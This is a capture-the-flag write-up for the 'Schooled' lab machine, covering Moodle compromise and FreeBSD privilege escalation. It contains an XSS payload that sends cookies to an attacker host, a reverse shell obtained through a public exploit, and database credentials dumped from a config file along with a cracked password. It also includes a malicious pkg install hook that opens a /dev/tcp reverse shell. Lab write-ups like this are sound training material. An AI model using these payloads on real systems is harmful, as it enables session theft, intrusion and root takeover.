Looking at the website on port 80, we have a domain name.

![](domain-name.png)

I add the domain name to my `/etc/hosts` and run `ffuf` to get new subdomains.

```sh
$ ffuf -u "http://schooled.htb/" -H "Host: FUZZ.schooled.htb" -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 20750

moodle                  [Status: 200, Size: 84, Words: 5, Lines: 2, Duration: 153ms]
```

The newly found subdomain is then added to `/etc/hosts` and we navigate to said subdomain.

Navigating to `moodle.schooled.htb`, looking around, we need to be logged in for some functionalities so we create an account and log in.

Looking at the site home, we several courses. I enroll myself to every available course, which is only "Mathematics" by "Manuel Phillips" since I can't enroll myself in the other courses. After enrolling in Mathematics, we can view the messages in the course, of which "Reminder for joining students" tells us to have our "MoodleNet profile" set. Since the teacher says they're going to check the students to see that this parameter is set, we can assume we can perform XSS. We set up an HTTP listener and edit our "MoodleNet profile" with XSS payloads aiming to steal the cookie. Upon saving our profile, we're directed to our profile page where many requests with our own cookie should be sent to our HTTP listener due to XSS. I found the following payload to work:

```
<img src=# onerror=this.src="http://ATK_IP:8000/?"+document.cookie;>
```

After confirming that the payload works, I get away from the profile page to stop the unwanted traffic and wait for Manuel's cookie. After catching and editing our cookie, we become Manuel.

According the [Moodle](https://docs.moodle.org/311/en/Moodle_version), one way we can view the version of Moodle is as follows:

> For Moodle sites in English or German (only), if you are a regular teacher with no admin access, you might be able to find your Moodle version by clicking on "Moodle Docs for this page" at the bottom of any Moodle page when logged in.

In doing as instructed, we're able to discern that we're using Moodle version 3.9. Looking up "moodle 3.9 exploit", we get [an exploit on Exploit DB](https://www.exploit-db.com/exploits/50180). Using the exploit with our cookie as a teacher, we're able to get a reverse shell (supplied as the command) as "www".

Looking around `/usr/local/www/apache24`, we find that `/usr/local/www/apache24/data/moodle/config.php` contains MySQL credentials. We can't just run `mysql`, however, as it seems to not be in our `PATH`, so we `find` it.

```sh
[www@Schooled /usr/local/www/apache24/data/moodle]$ find / -name mysql -type f 2>/dev/null
/usr/local/bin/mysql
/usr/local/share/bash-completion/completions/mysql
/var/mail/mysql
```

With our `mysql` binary, we can log in.

```sh
[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ /usr/local/bin/mysql -u root -pPlaybookMaster2020 -e "show databases"
mysql: [Warning] Using a password on the command line interface can be insecure.
Database
information_schema
moodle
mysql
performance_schema
sys
```

In database "moodle", table "mdl_user", we have multiple password hashes. We should be able to crack admin's hash (`!QAZ2wsx`) with hashcat and rockyou. We can attempt to log into SSH as "admin", but that doesn't work. Looking at `/etc/passwd`, 3 users have a shell: root, jamie and steve. Among the 3, we're only able to log in as jamie with the cracked password.

Checking jamie's sudo privileges ...

```sh
jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```

We're able to run `pkg` to install packages as root without a password. Following [this article](http://lastsummer.de/creating-custom-packages-on-freebsd/) we can create a custom package.

Create and run the following script

```sh
#!/bin/sh

STAGEDIR=/tmp/stage
rm -rf ${STAGEDIR}
mkdir -p ${STAGEDIR}

cat >> ${STAGEDIR}/+PRE_DEINSTALL <<EOF
# careful here, this may clobber your system
echo "Resetting root shell"
pw usermod -n root -s /bin/csh
EOF

cat >> ${STAGEDIR}/+POST_INSTALL <<EOF
# careful here, this may clobber your system
echo "Registering root shell"
pw usermod -n root -s /bin/sh
bash -c 'exec bash -i &>/dev/tcp/10.10.14.33/1337 <&1'
EOF

cat >> ${STAGEDIR}/+MANIFEST <<EOF
name: mypackage
version: "1.0_5"
origin: sysutils/mypackage
comment: "automates stuff"
desc: "automates tasks which can also be undone later"
maintainer: john@doe.it
www: https://doe.it
prefix: /
EOF

pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -o .
```

After that, set up a `nc` listener to catch the shell and run the following

```sh
sudo /usr/sbin/pkg update
sudo /usr/sbin/pkg install --no-repo-update *.txz
```

With that, we should have a root shell.
